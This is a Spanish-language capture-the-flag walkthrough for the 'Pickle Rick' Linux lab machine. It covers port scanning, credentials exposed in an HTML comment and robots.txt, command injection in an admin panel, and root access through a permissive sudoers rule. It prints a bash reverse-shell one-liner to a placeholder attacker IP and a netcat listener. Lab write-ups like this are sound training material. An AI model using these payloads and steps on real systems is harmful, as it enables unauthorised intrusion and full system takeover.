# Pickle Rick

Conceptos clave: Web Enumeration, Source Code Inspection, Hardcoded Credentials, Authenticated RCE (Command Injection), Reverse Shell, Sudo Misconfiguration
Dificultad: Fácil
Fecha: 23 de junio de 2026

## Resumen
Compromiso de la máquina **Pickle Rick** (Linux) explotando vulnerabilidades críticas derivadas de malas prácticas de desarrollo web. La auditoría reveló exposición de datos sensibles (credenciales *hardcodeadas* en comentarios HTML y en el archivo `robots.txt`). Esto permitió el acceso a un panel de administración que sufría de una vulnerabilidad de Inyección de Comandos (RCE). Tras evadir las restricciones ejecutando un *payload* de Bash, se obtuvo una *Reverse Shell*. La escalada de privilegios a `root` fue trivial debido a una configuración excesivamente permisiva en el archivo `sudoers`.

---

## 1. Reconocimiento (Recon)

### 1.1 Escaneo de Puertos
Se procedió a mapear la superficie de ataque con un escaneo TCP completo y detección de versiones:

```bash
nmap -p- --open --min-rate 5000 -n -Pn -sS -v <IP>
nmap -p 22,80 -sC -sV <IP>
```

**Puertos descubiertos:**
* `22/tcp`: SSH (OpenSSH).
* `80/tcp`: HTTP (Apache/Ubuntu).

### 1.2 Enumeración Web (Scripts NSE)
Se lanzó el script `http-enum` de Nmap para automatizar el descubrimiento de directorios estándar:

```bash
nmap -p 80 --script http-enum <IP>
```
**Hallazgos relevantes:** El escaneo reveló la existencia del archivo `robots.txt` y de un portal de autenticación (`login.php`).

---

## 2. Acceso Inicial (Initial Access)

### 2.1 OSINT y Exposición de Datos Sensibles
Se realizó una auditoría manual de la aplicación web alojada en el puerto 80:
1. **Inspección de código fuente:** Al analizar el código HTML de la página principal (`index.html`), se descubrió un comentario dejado por los desarrolladores que revelaba un nombre de usuario válido.
2. **Análisis del `robots.txt`:** Al consultar este archivo, en lugar de directivas de indexación estándar, se descubrió una cadena de texto que resultó ser la contraseña en texto plano del usuario anterior.

Con estas credenciales, se logró evadir el panel de autenticación en `login.php`.

### 2.2 Inyección de Comandos (Authenticated RCE)
Una vez dentro de la sesión autenticada, se identificó un panel diseñado para la ejecución de comandos del sistema operativo (Command Panel).

Se procedió a validar la vulnerabilidad inyectando comandos básicos (`whoami`, `ls`). Tras confirmar la inyección, se preparó un *listener* en la máquina atacante:

```bash
nc -nlvp 4444
```

A continuación, se inyectó un *payload* clásico de Bash para redirigir la entrada/salida estándar hacia el *listener* y obtener una *Reverse Shell* interactiva:

```bash
bash -c 'bash -i >& /dev/tcp/<IP-ATACANTE>/4444 0>&1'
```

**Resultado:** Se obtuvo conexión en la máquina atacante bajo el contexto del usuario del servidor web (`www-data`), logrando leer las dos primeras banderas.

---

## 3. Escalada de Privilegios (Privilege Escalation)

### 3.1 Enumeración de Privilegios Locales
Para elevar privilegios, se realizó una comprobación de los permisos de Sudo del usuario comprometido:

```bash
sudo -l
```

### 3.2 Explotación (Sudoers Misconfiguration)
El resultado del comando indicó que el usuario `www-data` podía ejecutar **cualquier comando** (`ALL : ALL`) sin requerir contraseña (`NOPASSWD`).

Se aprovechó esta mala configuración para generar una sesión interactiva como el superusuario:

```bash
sudo -i
```

**Resultado:** Compromiso total del sistema. Se obtuvo una consola como `root`, permitiendo leer la tercera y última bandera de la máquina.
